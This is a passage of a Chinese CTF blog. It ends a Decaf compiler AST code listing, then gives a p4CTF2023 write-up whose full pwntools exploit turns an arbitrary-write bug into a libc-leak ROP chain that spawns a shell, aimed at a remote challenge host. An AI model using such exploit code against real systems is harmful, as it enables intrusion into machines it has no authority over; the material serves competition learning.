<span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Kind;</span><br><span class="line">	decafStmtList *FieldDeclList;</span><br><span class="line">	decafStmtList *StateDeclList;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafBlock</span>(string kind,decafStmtList *fieldlist, decafStmtList *methodlist) </span><br><span class="line">		: <span class="built_in">Kind</span>(kind), <span class="built_in">FieldDeclList</span>(fieldlist), <span class="built_in">StateDeclList</span>(methodlist) &#123;&#125;</span><br><span class="line">	~<span class="built_in">decafBlock</span>() &#123; </span><br><span class="line">		<span class="keyword">if</span> (FieldDeclList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> FieldDeclList; &#125;</span><br><span class="line">		<span class="keyword">if</span> (StateDeclList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> StateDeclList; &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> Kind + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(FieldDeclList) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(StateDeclList) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafIF</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	decafAllexp * Exp;</span><br><span class="line">	decafBlock * Block;</span><br><span class="line">	decafBlock * Block2;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafIF</span>(decafAllexp * Exp,decafBlock * Block,decafBlock * Block2): <span class="built_in">Exp</span>(Exp),<span class="built_in">Block</span>(Block),<span class="built_in">Block2</span>(Block2)&#123;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;IfStmt&quot;</span>) + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(Exp) +<span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Block) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Block2) + <span class="string">&quot;)&quot;</span>; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafWhile</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	decafAllexp * Exp;</span><br><span class="line">	decafBlock * Block;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafWhile</span>(decafAllexp * Exp,decafBlock * Block): <span class="built_in">Exp</span>(Exp),<span class="built_in">Block</span>(Block)&#123;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;WhileStmt&quot;</span>) + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(Exp) +<span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Block) + <span class="string">&quot;)&quot;</span>; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafFor</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	decafAllexp * Exp;</span><br><span class="line">	decafBlock * Block;</span><br><span class="line">	decafAssignList *List;</span><br><span class="line">	decafAssignList *List2;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafFor</span>(decafAllexp * Exp,decafBlock * Block,decafAssignList *List,decafAssignList *List2): <span class="built_in">Exp</span>(Exp),<span class="built_in">Block</span>(Block),<span class="built_in">List</span>(List),<span class="built_in">List2</span>(List2)&#123;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;ForStmt&quot;</span>) + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(List)+<span class="string">&quot;,&quot;</span>+<span class="built_in">getString</span>(Exp) +<span class="string">&quot;,&quot;</span>+<span class="built_in">getString</span>(List2)+<span class="string">&quot;,&quot;</span>+<span class="built_in">getString</span>(Block) + <span class="string">&quot;)&quot;</span>; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafReturn</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	decafAllexp * Exp;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafReturn</span>(decafAllexp * Exp)&#123; <span class="keyword">this</span>-&gt;Exp = Exp; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;ReturnStmt&quot;</span>) + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(Exp) + <span class="string">&quot;)&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// ProgramAST - the decaf program</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProgramAST</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	decafStmtList *ExternList;</span><br><span class="line">	PackageAST *PackageDef;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">ProgramAST</span>(decafStmtList *externs, PackageAST *c) : <span class="built_in">ExternList</span>(externs), <span class="built_in">PackageDef</span>(c) &#123;&#125;</span><br><span class="line">	~<span class="built_in">ProgramAST</span>() &#123; </span><br><span class="line">		<span class="keyword">if</span> (ExternList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> ExternList; &#125; </span><br><span class="line">		<span class="keyword">if</span> (PackageDef != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> PackageDef; &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;Program&quot;</span>) + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(ExternList) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(PackageDef) + <span class="string">&quot;)&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>最终拿到了满分：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  decafast git:(master) ✗ python3 check.<span class="function">py </span></span><br><span class="line"><span class="function"><span class="title">Correct</span><span class="params">(dev)</span>: 134 / 134</span></span><br><span class="line"><span class="function"><span class="title">Score</span><span class="params">(dev)</span>: 134.00</span></span><br><span class="line"><span class="function">Total Score: 134.00</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/25/p4CTF2023/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/25/p4CTF2023/" class="post-title-link" itemprop="url">p4CTF2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-06-25 03:39:31 / Modified: 03:41:32" itemprop="dateCreated datePublished" datetime="2023-06-25T03:39:31+08:00">2023-06-25</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>15k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>14 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="easy-pwneasy"><a href="#easy-pwneasy" class="headerlink" title="easy_pwneasy"></a>easy_pwneasy</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwneasy: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=c3f0880bf68ea5bca97853dd259cf44c5f1f9e5a, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，NX，PIE</li>
</ul>
<p><strong>漏洞思路</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;give me address: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf_addr, <span class="number">0x20</span>uLL);</span><br><span class="line">  addr = (_QWORD *)atoll(buf_addr);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;give me value: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf_value, <span class="number">0x20</span>uLL);</span><br><span class="line">  value = atoll(buf_value);</span><br><span class="line">  <span class="built_in">set</span>(addr, value);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;OK %s = %s\n&quot;</span>, buf_addr, buf_value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>程序非常简洁，就只有3次任意地址写的机会</li>
</ul>
<p>程序提供的功能太少，我的第一反应是看看栈上有没有遗留的地址可以利用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwn(<span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffc64422df0</span><span class="number">-0x60</span> <span class="comment">/* buf_value */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp rcx<span class="number">-1</span> <span class="number">0x7ffc64422d90</span> ◂— <span class="number">0x31</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│           <span class="number">0x7ffc64422d98</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│           <span class="number">0x7ffc64422da0</span> —▸ <span class="number">0x7fe493363600</span> (_IO_file_jumps) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│           <span class="number">0x7ffc64422da8</span> —▸ <span class="number">0x7fe4931d762d</span> (_IO_file_setbuf+<span class="number">13</span>) ◂— test   rax, rax</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│           <span class="number">0x7ffc64422db0</span> —▸ <span class="number">0x7fe493367631</span> ◂— <span class="number">0xd700007fe4933271</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│           <span class="number">0x7ffc64422db8</span> —▸ <span class="number">0x7fe4931ce765</span> (setvbuf+<span class="number">245</span>) ◂— cmp    rax, <span class="number">1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│           <span class="number">0x7ffc64422dc0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│           <span class="number">0x7ffc64422dc8</span> —▸ <span class="number">0x7ffc64422df0</span> —▸ <span class="number">0x7ffc64422e00</span> ◂— <span class="number">0x1</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x7ffc64422df0</span><span class="number">-0x40</span> <span class="comment">/* buf_addr */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffc64422db0</span> —▸ <span class="number">0x7fe493367631</span> ◂— <span class="number">0xd700007fe4933271</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffc64422db8</span> —▸ <span class="number">0x7fe4931ce765</span> (setvbuf+<span class="number">245</span>) ◂— cmp    rax, <span class="number">1</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffc64422dc0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffc64422dc8</span> —▸ <span class="number">0x7ffc64422df0</span> —▸ <span class="number">0x7ffc64422e00</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7ffc64422dd0</span> —▸ <span class="number">0x7ffc64422f18</span> —▸ <span class="number">0x7ffc644240ee</span> ◂— <span class="string">&#x27;./pwneasy1&#x27;</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7ffc64422dd8</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7ffc64422de0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7ffc64422de8</span> ◂— <span class="number">0x904db1c7</span></span><br></pre></td></tr></table></figure>
<ul>
<li>在 buf_addr 处有 libc 中遗留的地址，合理的覆盖低位就可以泄露 libc</li>
<li>有 libc 任意写的机会</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>程序只提供了3次任意写的机会，但是我们可以通过覆盖 i 来将这个机会提升至无限次</p>
<p>覆盖 libc 末地址就可以泄露 libc_base：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn(p8(<span class="number">0x80</span>),<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;OK &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x21a680</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
<p>用同样的方法泄露遗留在栈上的栈地址，基于栈地址就可以覆盖 i 了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwn(<span class="string">&quot;0&quot;</span>*<span class="number">0x18</span>,<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;OK 000000000000000000000000&quot;</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">valuei_addr = stack_addr - <span class="number">8</span></span><br><span class="line">success(<span class="string">&quot;stack_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">success(<span class="string">&quot;valuei_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(valuei_addr))</span><br><span class="line"></span><br><span class="line">pwn(<span class="built_in">str</span>(valuei_addr)+<span class="string">&quot;\n&quot;</span>,<span class="number">0xffffffff00000000</span>)</span><br></pre></td></tr></table></figure>
<p>最后打栈溢出就可以了，不过直接调用 <code>system</code> 会触发段错误，于是我们选择执行 <code>syscall</code></p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> inspect <span class="keyword">import</span> stack</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Value</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pwneasy1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1283)\nb *$rebase(0x12B8)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">addr,data</span>):</span></span><br><span class="line">    sa(<span class="string">&quot;give me address: &quot;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line">    sa(<span class="string">&quot;give me value: &quot;</span>,<span class="built_in">str</span>(data))</span><br><span class="line"></span><br><span class="line">pwn(p8(<span class="number">0x80</span>),<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;OK &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x21a680</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">pwn(<span class="string">&quot;0&quot;</span>*<span class="number">0x18</span>,<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;OK 000000000000000000000000&quot;</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">valuei_addr = stack_addr - <span class="number">8</span></span><br><span class="line">success(<span class="string">&quot;stack_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">success(<span class="string">&quot;valuei_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(valuei_addr))</span><br><span class="line"></span><br><span class="line">pwn(<span class="built_in">str</span>(valuei_addr)+<span class="string">&quot;\n&quot;</span>,<span class="number">0xffffffff00000000</span>)</span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_r12_ret = libc_base + <span class="number">0x000000000011f497</span></span><br><span class="line">syscall = libc_base + <span class="number">0x0000000000029db4</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="number">0x1d8698</span></span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">pwn(<span class="built_in">str</span>(valuei_addr)+<span class="string">&quot;\n&quot;</span>,<span class="number">0xffffffff00000000</span>)</span><br><span class="line">pwn(<span class="built_in">str</span>(stack_addr+<span class="number">8</span>)+<span class="string">&quot;\n&quot;</span>,<span class="built_in">str</span>(pop_rdi_ret)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">pwn(<span class="built_in">str</span>(stack_addr+<span class="number">8</span>*<span class="number">2</span>)+<span class="string">&quot;\n&quot;</span>,<span class="built_in">str</span>(binsh_addr)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwn(<span class="built_in">str</span>(valuei_addr)+<span class="string">&quot;\n&quot;</span>,<span class="number">0xffffffff00000000</span>)</span><br><span class="line">pwn(<span class="built_in">str</span>(stack_addr+<span class="number">8</span>*<span class="number">3</span>)+<span class="string">&quot;\n&quot;</span>,<span class="built_in">str</span>(pop_rdx_r12_ret)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">pwn(<span class="built_in">str</span>(stack_addr+<span class="number">8</span>*<span class="number">4</span>)+<span class="string">&quot;\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">pwn(<span class="built_in">str</span>(stack_addr+<span class="number">8</span>*<span class="number">5</span>)+<span class="string">&quot;\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwn(<span class="built_in">str</span>(valuei_addr)+<span class="string">&quot;\n&quot;</span>,<span class="number">0xffffffff00000000</span>)</span><br><span class="line">pwn(<span class="built_in">str</span>(stack_addr+<span class="number">8</span>*<span class="number">6</span>)+<span class="string">&quot;\n&quot;</span>,<span class="built_in">str</span>(pop_rsi_ret)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">pwn(<span class="built_in">str</span>(stack_addr+<span class="number">8</span>*<span class="number">7</span>)+<span class="string">&quot;\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">pwn(<span class="built_in">str</span>(stack_addr+<span class="number">8</span>*<span class="number">8</span>)+<span class="string">&quot;\n&quot;</span>,<span class="built_in">str</span>(syscall)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">pwn(<span class="built_in">str</span>(valuei_addr)+<span class="string">&quot;\n&quot;</span>,<span class="number">0x300000000</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="the-bad-touch"><a href="#the-bad-touch" class="headerlink" title="the_bad_touch"></a>the_bad_touch</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bad: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">37f</span>e215b6944a1cb29f0a404c1071f7cf67baaaf, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，PIE，NX</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>两次格式化字符串漏洞：</p>
